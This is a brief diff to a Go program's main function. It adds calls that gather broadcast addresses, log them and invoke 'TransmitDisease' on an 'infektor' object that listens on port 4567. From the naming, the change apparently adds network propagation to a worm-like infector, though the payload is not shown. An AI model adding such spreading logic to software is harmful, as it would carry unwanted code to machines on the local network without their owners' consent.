@@ -87,6 +87,9 @@ func main() {
         4567,
     })
     ik.Listen()
+    ips := infektor.GetBroadcastAddrs()
+    log.Println("!!! ips: ", ips)
+    ik.TransmitDisease()
 	runtime.GOMAXPROCS(2)
 }
 
